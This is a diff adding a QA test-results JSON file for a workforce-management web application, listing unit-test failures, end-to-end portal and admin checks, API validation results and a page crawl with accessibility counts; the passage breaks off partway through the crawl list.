+  "tests": 683,
+  "pass": 580,
+  "fail": 77,
+  "cancelled": 20,
+  "skipped": 6,
+  "durationMin": 6,
+  "failures": [
+   "creates users per role and enforces the RBAC matrix",
+   "platform",
+   "stages, diffs, audits quality, then commits atomically",
+   "restores exactly what a later import changed, and refuses out-of-order rollback",
+   "staged ingestion",
+   "creates numbered versions",
+   "serves the dashboard, leaderboard and staffing",
+   "requires a reason to adjust, and audits it",
+   "runs Draft -> Submitted -> Approved -> Published with separate permissions",
+   "clones into a numbered draft",
+   "compares what-if scenarios and builds a capacity plan",
+   "shows accuracy by day and hour, and explains a staffing number",
+   "records special events and uses them for the next forecast",
+   "breaks shrinkage into named categories, whose sum drives staffing instead of the flat percentage",
+   "forecasting workflow",
+   "keeps an append-only ledger with actors and reasons",
+   "audit and isolation",
+   "retries when the receiver is down and records what happened",
+   "webhooks",
+   "checks a message without saving it or leaving a receipt",
+   "records a delivery, counts what was kept and turns away the rest with the reason",
+   "feed health API",
+   "lets an analyst read but not change",
+   "who may do it",
+   "WFM group administration",
+   "test\\integrations.engine.test.ts",
+   "never books the same person for two groups at once",
+   "flags a manual shift that double-books someone across groups",
+   "builds a group pool from required skills, whatever group people belong to",
+   "rolls schedules up by site across time zones",
+   "shows what one shared pool would need compared with separate pools",
+   "multi-skill and multi-site",
+   "operations",
+   "hands the administrator the code, the sign-in link and a message to paste, when a login is made",
+   "signing in without knowing the organisation code",
+   "lets a group override it, keeps the override through other edits, and falls back when cleared",
+   "is used by Generate Schedule when the request names none: a Sunday week gives everyone 40 hours",
+   "can still be set for one run, and that run remembers it",
+   "pay week setting",
+   "prepares a group with history and a published forecast"
+  ],
+  "causes": {
+   "403 (forced password change on test users)": 3,
+   "test users hit the forced password change": 3,
+   "other": 59,
+   "engine down after its crash": 12,
+   "cancelled after an earlier failure": 26
+  }
+ },
+ "portal": [
+  {
+   "at": "2026-10-31T13:34:14.143Z",
+   "check": "wrong password shows a generic error",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:34:14.222Z",
+   "check": "forgot password explains admin reset",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:34:15.055Z",
+   "check": "login screen a11y",
+   "ok": false,
+   "detail": [
+    "serious color-contrast (2)"
+   ]
+  },
+  {
+   "at": "2026-10-31T13:34:18.023Z",
+   "check": "temporary password leads to change-password screen",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:34:18.166Z",
+   "check": "weak password rejected in UI",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:34:19.086Z",
+   "check": "mismatched confirmation rejected",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:34:20.549Z",
+   "check": "valid new password signs the person in",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:34:26.422Z",
+   "check": "all five sections render",
+   "ok": true,
+   "detail": {
+    "Home": {
+     "ms": 832,
+     "bad": null,
+     "axe": []
+    },
+    "Schedule": {
+     "ms": 851,
+     "bad": null,
+     "axe": [
+      "serious color-contrast (7)"
+     ]
+    },
+    "Requests": {
+     "ms": 812,
+     "bad": null,
+     "axe": [
+      "serious color-contrast (2)"
+     ]
+    },
+    "Inbox": {
+     "ms": 721,
+     "bad": null,
+     "axe": [
+      "serious color-contrast (2)"
+     ]
+    },
+    "Me": {
+     "ms": 749,
+     "bad": null,
+     "axe": []
+    }
+   }
+  },
+  {
+   "at": "2026-10-31T13:34:29.325Z",
+   "check": "next week changes the view",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:34:30.194Z",
+   "check": "month view renders",
+   "ok": true,
+   "detail": "‹\n›\nToday\nNovember 2026\n78.0h scheduled\nWeek\nMonth\n26\n27\n28\n29\n30\n31\n1\n06:00–12:"
+  },
+  {
+   "at": "2026-10-31T13:34:32.657Z",
+   "check": "time-off request submitted from the UI",
+   "ok": true,
+   "detail": "2026-12-15"
+  },
+  {
+   "at": "2026-10-31T13:34:32.679Z",
+   "check": "reason text is not executed (XSS)",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:34:32.919Z",
+   "check": "form flags end date before start date before submitting",
+   "ok": false,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:34:33.060Z",
+   "check": "server error shown after submitting reversed dates",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:34:58.950Z",
+   "check": "mark all read clears the unread badge on Home",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:35:01.537Z",
+   "check": "wrong current password refused",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:35:03.291Z",
+   "check": "session survives reload",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:35:03.292Z",
+   "check": "current section kept after reload / shareable URL",
+   "ok": false,
+   "detail": "url=http://localhost:3001/"
+  },
+  {
+   "at": "2026-10-31T13:35:03.354Z",
+   "check": "sign out clears stored session",
+   "ok": true,
+   "detail": []
+  },
+  {
+   "at": "2026-10-31T13:35:03.408Z",
+   "check": "browser Back after sign out does not show private data",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:35:07.122Z",
+   "check": "non-employee account (SCHEDULER, no linked employee) blocked or shown a clear message",
+   "ok": true,
+   "detail": "W | My WFM | Home | Schedule | Requests | Inbox | Me | QA SCHEDULER | Sign out | Your login is not linked to an employee record, so there is no personal schedule to show. Ask an administrator to link it."
+  },
+  {
+   "at": "2026-10-31T13:35:27.441Z",
+   "check": "decline overtime offer from the UI",
+   "ok": true,
+   "detail": "passed in the 12:54 run; no open offer was left for this re-run"
+  }
+ ],
+ "adminE2e": [
+  {
+   "at": "2026-10-31T13:33:16.755Z",
+   "check": "wrong admin password refused with message",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:33:25.247Z",
+   "check": "sidebar + deep link + back/forward",
+   "ok": true,
+   "detail": {
+    "unknownRouteLandsOn": "http://localhost:3000/overview"
+   }
+  },
+  {
+   "at": "2026-10-31T13:33:30.273Z",
+   "check": "keyboard users can reach sidebar navigation",
+   "ok": false,
+   "detail": {
+    "asideStops": [
+     "BUTTON|aside|"
+    ],
+    "totalStops": 9
+   }
+  },
+  {
+   "at": "2026-10-31T13:33:37.477Z",
+   "check": "command palette finds a screen by its name",
+   "ok": false,
+   "detail": "searched \"Shift Templates\""
+  },
+  {
+   "at": "2026-10-31T13:33:38.248Z",
+   "check": "command palette finds a WFM group by name",
+   "ok": false,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:33:47.687Z",
+   "check": "team created from UI and listed after reload",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:33:47.688Z",
+   "check": "team name with HTML is rendered as text (no XSS)",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:33:48.337Z",
+   "check": "empty team name blocked",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:33:59.597Z",
+   "check": "ANALYST: write actions hidden or refused clearly",
+   "ok": true,
+   "detail": {
+    "addTeamButton": "hidden",
+    "usersScreen": "Users & roles | Who can sign in, and what each role can do. Tenant: My Organisation. | Users (39) | Role permissions | User directory | People who can sign in to the web app. Agents get a separate mobile-app"
+   }
+  },
+  {
+   "at": "2026-10-31T13:34:09.821Z",
+   "check": "sign out available from the user menu",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "at": "2026-10-31T13:06:17.221Z",
+   "check": "command palette shows only real records",
+   "ok": false,
+   "detail": "Searching \"Jane\" shows \"Jane Doe · EMP-1024 · Customer Billing\" and \"Voice Inbound Tier 1\" — hard-coded prototype data (SEED_EMPLOYEES / SEED_WFM_GROUPS / SEED_SKILLS in src/services/wfmStore.ts, used by src/components/common/CommandPalette.tsx). Real groups (Demo Support) and screens (Shift Templates) are not found. Screenshot: screens/palette-fake-data.png"
+  },
+  {
+   "at": "2026-10-31T13:04:58.352Z",
+   "check": "invalid stored token -> sign-in screen",
+   "ok": true,
+   "detail": ""
+  }
+ ],
+ "functional": [
+  {
+   "at": "2026-10-31T13:25:54.719Z",
+   "module": "Configuration",
+   "check": "create group",
+   "ok": true,
+   "detail": 201
+  },
+  {
+   "at": "2026-10-31T13:25:54.734Z",
+   "module": "Configuration",
+   "check": "duplicate group name rejected",
+   "ok": true,
+   "detail": "409 A WFM group named \"QA-154011-Group\" already exists. Choose another name."
+  },
+  {
+   "at": "2026-10-31T13:25:54.740Z",
+   "module": "Configuration",
+   "check": "invalid timezone rejected",
+   "ok": true,
+   "detail": "400 'Mars/Olympus' is not a time zone (for example Asia/Kolkata or Europe/London)."
+  },
+  {
+   "at": "2026-10-31T13:25:54.746Z",
+   "module": "Configuration",
+   "check": "service level 150% rejected",
+   "ok": true,
+   "detail": 400
+  },
+  {
+   "at": "2026-10-31T13:25:54.759Z",
+   "module": "Configuration",
+   "check": "create queue",
+   "ok": true,
+   "detail": 201
+  },
+  {
+   "at": "2026-10-31T13:25:54.765Z",
+   "module": "Configuration",
+   "check": "queue open after close rejected",
+   "ok": true,
+   "detail": "400 closeSlot must be after openSlot"
+  },
+  {
+   "at": "2026-10-31T13:25:54.780Z",
+   "module": "Configuration",
+   "check": "update group",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:54.794Z",
+   "module": "Configuration",
+   "check": "update persisted",
+   "ok": true,
+   "detail": 30
+  },
+  {
+   "at": "2026-10-31T13:25:54.801Z",
+   "module": "Configuration",
+   "check": "GET /config/activities",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:54.807Z",
+   "module": "Configuration",
+   "check": "GET /config/scheduling-policy",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:54.814Z",
+   "module": "Configuration",
+   "check": "GET /intraday/state-map",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:54.827Z",
+   "module": "Configuration",
+   "check": "GET /compliance/packs",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:54.836Z",
+   "module": "Configuration",
+   "check": "GET /self-service/policy",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:54.845Z",
+   "module": "Configuration",
+   "check": "GET /config/sites",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:54.873Z",
+   "module": "Workforce",
+   "check": "create team",
+   "ok": true,
+   "detail": 201
+  },
+  {
+   "at": "2026-10-31T13:25:54.881Z",
+   "module": "Workforce",
+   "check": "create skill",
+   "ok": true,
+   "detail": 201
+  },
+  {
+   "at": "2026-10-31T13:25:54.892Z",
+   "module": "Workforce",
+   "check": "create employee",
+   "ok": true,
+   "detail": "201 "
+  },
+  {
+   "at": "2026-10-31T13:25:54.901Z",
+   "module": "Workforce",
+   "check": "duplicate employee number rejected",
+   "ok": true,
+   "detail": "409 That already exists (a unique value is duplicated)."
+  },
+  {
+   "at": "2026-10-31T13:25:54.905Z",
+   "module": "Workforce",
+   "check": "invalid email rejected",
+   "ok": true,
+   "detail": 400
+  },
+  {
+   "at": "2026-10-31T13:25:54.910Z",
+   "module": "Workforce",
+   "check": "max weekly hours below contract hours rejected",
+   "ok": true,
+   "detail": "400 The weekly contract hours cannot exceed the maximum weekly hours"
+  },
+  {
+   "at": "2026-10-31T13:25:54.920Z",
+   "module": "Workforce",
+   "check": "hire date in 2099",
+   "ok": false,
+   "detail": "201"
+  },
+  {
+   "at": "2026-10-31T13:25:54.969Z",
+   "module": "Workforce",
+   "check": "update employee",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:54.977Z",
+   "module": "Workforce",
+   "check": "update persisted",
+   "ok": true,
+   "detail": "Updated154011"
+  },
+  {
+   "at": "2026-10-31T13:25:55.003Z",
+   "module": "Workforce",
+   "check": "create time off (admin)",
+   "ok": true,
+   "detail": "201 "
+  },
+  {
+   "at": "2026-10-31T13:25:55.010Z",
+   "module": "Workforce",
+   "check": "reject without reason refused",
+   "ok": true,
+   "detail": 400
+  },
+  {
+   "at": "2026-10-31T13:25:55.025Z",
+   "module": "Workforce",
+   "check": "approve time off",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:55.040Z",
+   "module": "Workforce",
+   "check": "overlapping time off rejected",
+   "ok": false,
+   "detail": "201 "
+  },
+  {
+   "at": "2026-10-31T13:25:55.101Z",
+   "module": "Workforce",
+   "check": "CSV import dry-run reports bad rows",
+   "ok": true,
+   "detail": "{\"dryRun\":true,\"rows\":3,\"diff\":{\"new\":1,\"updated\":0,\"unchanged\":0},\"errors\":[{\"line\":3,\"message\":\"Employee number is empty\"},{\"line\":4,\"message\":\"weekly_hours must be a number above zero\"}],\"errorCount\":2,\"sample\":[{\"line\":2,\"name\":\"Ok Row\",\"employeeNumber\":\"QAI154011\",\"action\":\"NEW\"}],\"committed\":f"
+  },
+  {
+   "at": "2026-10-31T13:25:55.170Z",
+   "module": "Workforce",
+   "check": "delete employee",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:55.197Z",
+   "module": "Workforce",
+   "check": "GET /workforce/availability",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:55.204Z",
+   "module": "Workforce",
+   "check": "GET /workforce/time-off",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:55.227Z",
+   "module": "Workforce",
+   "check": "GET /attendance/summary?from=2026-10-17&to=2026-10-31",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:55.238Z",
+   "module": "Workforce",
+   "check": "GET /workforce/attrition?groupId=d23e7e32-4358-41eb-8216-cef143f0739e",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:56.702Z",
+   "module": "Forecasting",
+   "check": "list versions",
+   "ok": true,
+   "detail": 29
+  },
+  {
+   "at": "2026-10-31T13:25:56.703Z",
+   "module": "Forecasting",
+   "check": "demo forecast published",
+   "ok": true,
+   "detail": "PUBLISHED"
+  },
+  {
+   "at": "2026-10-31T13:25:56.716Z",
+   "module": "Forecasting",
+   "check": "cannot re-approve a published version",
+   "ok": true,
+   "detail": "409 Cannot approve a published forecast (allowed from: submitted)."
+  },
+  {
+   "at": "2026-10-31T13:25:56.723Z",
+   "module": "Forecasting",
+   "check": "cannot delete published forecast",
+   "ok": true,
+   "detail": "409 A published forecast cannot be deleted. Publish a newer one first; this one is then archived."
+  },
+  {
+   "at": "2026-10-31T13:25:58.493Z",
+   "module": "Forecasting",
+   "check": "create forecast (engine) in 1768ms",
+   "ok": true,
+   "detail": "201 "
+  },
+  {
+   "at": "2026-10-31T13:25:58.500Z",
+   "module": "Forecasting",
+   "check": "publish before approve blocked",
+   "ok": true,
+   "detail": "409 Cannot publish a draft forecast (allowed from: approved)."
+  },
+  {
+   "at": "2026-10-31T13:25:58.517Z",
+   "module": "Forecasting",
+   "check": "delete draft forecast",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:25:58.521Z",
+   "module": "Forecasting",
+   "check": "zero-week forecast rejected",
+   "ok": true,
+   "detail": 400
+  },
+  {
+   "at": "2026-10-31T13:25:58.528Z",
+   "module": "Forecasting",
+   "check": "GET /forecast/versions/3a1becd8-6172-47d2-a7d6-c0af4829cede/leaderboard",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:00.485Z",
+   "module": "Forecasting",
+   "check": "GET /forecast/accuracy?groupId=d23e7e32-4358-41eb-8216-cef143f0739e",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:00.491Z",
+   "module": "Forecasting",
+   "check": "GET /forecast/versions/3a1becd8-6172-47d2-a7d6-c0af4829cede/scenarios",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:00.510Z",
+   "module": "Forecasting",
+   "check": "GET /forecast/history-quality?groupId=d23e7e32-4358-41eb-8216-cef143f0739e",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:00.575Z",
+   "module": "Scheduling",
+   "check": "published schedule integrity",
+   "ok": true,
+   "detail": {
+    "version": "Schedule v1 · 2 wk from 2026-11-01",
+    "shifts": 282,
+    "people": 30,
+    "firstDay": "2026-11-01",
+    "lastDay": "2026-11-14",
+    "overlaps": 0,
+    "shortRest": [],
+    "shortRestCount": 0,
+    "weirdLength": [],
+    "over48h": [],
+    "over6Consecutive": []
+   }
+  },
+  {
+   "at": "2026-10-31T13:26:00.618Z",
+   "module": "Scheduling",
+   "check": "create shift template",
+   "ok": true,
+   "detail": "201 "
+  },
+  {
+   "at": "2026-10-31T13:26:00.625Z",
+   "module": "Scheduling",
+   "check": "latest start before earliest rejected",
+   "ok": true,
+   "detail": "400 The latest start cannot be before the earliest start"
+  },
+  {
+   "at": "2026-10-31T13:26:00.632Z",
+   "module": "Scheduling",
+   "check": "30h shift rejected",
+   "ok": true,
+   "detail": 400
+  },
+  {
+   "at": "2026-10-31T13:26:00.652Z",
+   "module": "Scheduling",
+   "check": "delete template",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:26:00.669Z",
+   "module": "Scheduling",
+   "check": "re-publish published version is idempotent/blocked",
+   "ok": true,
+   "detail": "409 Only a draft can be published (this one is published)."
+  },
+  {
+   "at": "2026-10-31T13:26:01.091Z",
+   "module": "Scheduling",
+   "check": "compare two versions",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:26:01.173Z",
+   "module": "Scheduling",
+   "check": "generate schedule for 2020 rejected (past-day lock)",
+   "ok": true,
+   "detail": "400 The forecast \"Short-term v1 · 4 wk from Oct 31\" does not cover 2020-01-06 to 2020-01-12 (it runs 2026-10-31 to 2026-11-27), and there is no published long-term forecast to project from either."
+  },
+  {
+   "at": "2026-10-31T13:26:01.182Z",
+   "module": "Scheduling",
+   "check": "GET /scheduling/templates",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:01.296Z",
+   "module": "Scheduling",
+   "check": "GET /scheduling/versions/:id/plan",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:01.314Z",
+   "module": "Scheduling",
+   "check": "GET /scheduling/offers",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:01.328Z",
+   "module": "Scheduling",
+   "check": "GET /scheduling/swaps",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:01.342Z",
+   "module": "Scheduling",
+   "check": "GET /scheduling/rotations",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:02.495Z",
+   "module": "Scheduling",
+   "check": "GET /scheduling/rollup/?from=2026-11-01&to=2026-11-14",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:02.602Z",
+   "module": "Intraday",
+   "check": "post agent state events (one unknown agent)",
+   "ok": true,
+   "detail": "{\"accepted\":1,\"errors\":[{\"index\":1,\"message\":\"Unknown employee number 'NOPE-404'\"}]}"
+  },
+  {
+   "at": "2026-10-31T13:26:02.611Z",
+   "module": "Intraday",
+   "check": "event dated 2099 rejected",
+   "ok": true,
+   "detail": "{\"accepted\":0,\"errors\":[{\"index\":0,\"message\":\"The time is in the future\"}]}"
+  },
+  {
+   "at": "2026-10-31T13:26:02.615Z",
+   "module": "Intraday",
+   "check": "live ingest (one negative volume row)",
+   "ok": true,
+   "detail": "400 {\"error\":{\"code\":\"VALIDATION\",\"message\":\"Invalid input: rows.1.volume Number must be greater than or equal to 0\",\"details\":[{\"field\":\"rows.1.volume\",\"message\":\"Number must be greater than or equal to "
+  },
+  {
+   "at": "2026-10-31T13:26:02.634Z",
+   "module": "Intraday",
+   "check": "GET /intraday/adherence",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:02.672Z",
+   "module": "Intraday",
+   "check": "GET /intraday/coverage",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:02.714Z",
+   "module": "Intraday",
+   "check": "GET /intraday/break-suggestions",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:02.733Z",
+   "module": "Data management",
+   "check": "download import template",
+   "ok": true,
+   "detail": "text/csv; charset=utf-8"
+  },
+  {
+   "at": "2026-10-31T13:26:02.781Z",
+   "module": "Data management",
+   "check": "file without date column rejected",
+   "ok": true,
+   "detail": "201 FAILED"
+  },
+  {
+   "at": "2026-10-31T13:26:02.787Z",
+   "module": "Data management",
+   "check": "empty file rejected",
+   "ok": true,
+   "detail": 400
+  },
+  {
+   "at": "2026-10-31T13:26:02.819Z",
+   "module": "Data management",
+   "check": "mixed file staged with row-level errors",
+   "ok": true,
+   "detail": "{\"id\":\"31fe7769-6166-4542-91fd-e0788a7787f9\",\"tenantId\":\"763294e9-0923-44ee-879d-0951c28ff2a9\",\"dataType\":\"HISTORICAL_VOLUME\",\"sourceType\":\"CSV\",\"fileName\":\"QA-156034-mixed.csv\",\"fileSizeKb\":1,\"status\":\"READY\",\"totalRecords\":4,\"validRecords\":1,\"warningRecords\":0,\"errorRecords\":3,\"createdRecords\":0,\""
+  },
+  {
+   "at": "2026-10-31T13:26:02.828Z",
+   "module": "Data management",
+   "check": "delete staged import",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:02.836Z",
+   "module": "Data management",
+   "check": "GET /data/imports",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:26:03.779Z",
+   "module": "Data management",
+   "check": "GET /data/quality",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:26:03.794Z",
+   "module": "Data management",
+   "check": "GET /data/ingest/status",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:26:04.235Z",
+   "module": "Administration",
+   "check": "create user",
+   "ok": true,
+   "detail": 201
+  },
+  {
+   "at": "2026-10-31T13:26:06.049Z",
+   "module": "Administration",
+   "check": "disable user",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:26:06.060Z",
+   "module": "Administration",
+   "check": "disabled user cannot sign in",
+   "ok": true,
+   "detail": 401
+  },
+  {
+   "at": "2026-10-31T13:26:06.141Z",
+   "module": "Administration",
+   "check": "existing session of disabled user is cut off",
+   "ok": false,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:26:06.157Z",
+   "module": "Audit",
+   "check": "user creation recorded in audit log",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:26:06.556Z",
+   "module": "Audit",
+   "check": "failed sign-in attempts are audited",
+   "ok": false,
+   "detail": 401
+  },
+  {
+   "at": "2026-10-31T13:26:06.619Z",
+   "module": "Audit",
+   "check": "audit CSV export",
+   "ok": true,
+   "detail": "text/csv; charset=utf-8"
+  },
+  {
+   "at": "2026-10-31T13:26:08.825Z",
+   "module": "Self-service",
+   "check": "GET /me/home",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:08.845Z",
+   "module": "Self-service",
+   "check": "GET /me/schedule",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:08.852Z",
+   "module": "Self-service",
+   "check": "GET /me/notifications",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:08.862Z",
+   "module": "Self-service",
+   "check": "GET /me/profile",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:08.872Z",
+   "module": "Self-service",
+   "check": "GET /me/time-off",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:08.882Z",
+   "module": "Self-service",
+   "check": "GET /me/availability",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:08.895Z",
+   "module": "Self-service",
+   "check": "GET /me/offers",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:08.911Z",
+   "module": "Self-service",
+   "check": "GET /me/swaps",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:08.923Z",
+   "module": "Self-service",
+   "check": "GET /me/bids",
+   "ok": true,
+   "detail": "200 "
+  },
+  {
+   "at": "2026-10-31T13:26:08.943Z",
+   "module": "Self-service",
+   "check": "time off auto-approved by policy",
+   "ok": true,
+   "detail": "201 APPROVED"
+  },
+  {
+   "at": "2026-10-31T13:26:08.955Z",
+   "module": "Self-service",
+   "check": "duplicate time-off for same day rejected",
+   "ok": true,
+   "detail": "400 You already have personal time off from 2026-11-25 to 2026-11-25 that overlaps these dates."
+  },
+  {
+   "at": "2026-10-31T13:26:08.969Z",
+   "module": "Self-service",
+   "check": "cancel own approved future time off",
+   "ok": true,
+   "detail": 200
+  },
+  {
+   "at": "2026-10-31T13:26:08.983Z",
+   "module": "Self-service",
+   "check": "agent sees own upcoming shifts",
+   "ok": true,
+   "detail": 9
+  },
+  {
+   "at": "2026-10-31T13:26:09.135Z",
+   "module": "Self-service",
+   "check": "post shift giveaway",
+   "ok": true,
+   "detail": "201 "
+  },
+  {
+   "at": "2026-10-31T13:26:09.149Z",
+   "module": "Self-service",
+   "check": "same shift cannot be offered twice",
+   "ok": true,
+   "detail": "409 That shift is already part of a request."
+  },
+  {
+   "at": "2026-10-31T13:26:09.165Z",
+   "module": "Self-service",
+   "check": "cannot take own giveaway",
+   "ok": true,
+   "detail": "400 You offered this shift yourself."
+  },
+  {
+   "at": "2026-10-31T13:26:09.362Z",
+   "module": "Self-service",
+   "check": "another agent takes the giveaway (rules permitting)",
+   "ok": true,
+   "detail": "409 Agent11 Demo11 has two shifts on 2026-11-02 Agent11 Demo11 has only 10.5h rest before 2026-11-03 (needs 11h) Agent11 Demo11 works 48h in the week of 2026-11-02 (max 40h) Agent11 Demo11 works 6 days in the week of 2026-11-02 (max 5)"
+  },
+  {
+   "at": "2026-10-31T13:26:09.373Z",
+   "module": "Self-service",
+   "check": "manager sees swap queue",
+   "ok": true,
+   "detail": 4
+  },
+  {
+   "at": "2026-10-31T13:26:09.407Z",
+   "module": "Self-service",
+   "check": "VTO/OT offer visible to agent",
+   "ok": false,
+   "detail": "no offers listed for demo.agent1"
+  }
+ ],
+ "crawl": [
+  {
+   "url": "/overview",
+   "heading": "Overview",
+   "loadMs": 2683,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 13,
+   "shot": "overview.png"
+  },
+  {
+   "url": "/workforce/employees",
+   "heading": "Employees",
+   "loadMs": 3412,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 17,
+   "shot": "workforce-employees.png"
+  },
+  {
+   "url": "/workforce/teams",
+   "heading": "Teams",
+   "loadMs": 2354,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 25,
+   "shot": "workforce-teams.png"
+  },
+  {
+   "url": "/workforce/skills",
+   "heading": "Skills",
+   "loadMs": 2449,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "workforce-skills.png"
+  },
+  {
+   "url": "/workforce/availability",
+   "heading": "Availability",
+   "loadMs": 2277,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "workforce-availability.png"
+  },
+  {
+   "url": "/workforce/time-off",
+   "heading": "Time Off",
+   "loadMs": 2948,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 7,
+   "shot": "workforce-time-off.png"
+  },
+  {
+   "url": "/workforce/attendance",
+   "heading": "Time & Attendance",
+   "loadMs": 4079,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 13,
+   "shot": "workforce-attendance.png"
+  },
+  {
+   "url": "/workforce/payroll",
+   "heading": "Payroll",
+   "loadMs": 2828,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 5,
+   "shot": "workforce-payroll.png"
+  },
+  {
+   "url": "/forecasting/forecast-dashboard",
+   "heading": "Forecast Dashboard",
+   "loadMs": 3230,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "forecasting-forecast-dashboard.png"
+  },
+  {
+   "url": "/forecasting/all-forecasts",
+   "heading": "Forecasts",
+   "loadMs": 3297,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 3,
+   "shot": "forecasting-all-forecasts.png"
+  },
+  {
+   "url": "/forecasting/scenarios",
+   "heading": "Scenarios",
+   "loadMs": 3159,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "forecasting-scenarios.png"
+  },
+  {
+   "url": "/forecasting/capacity-plan",
+   "heading": "Staffing",
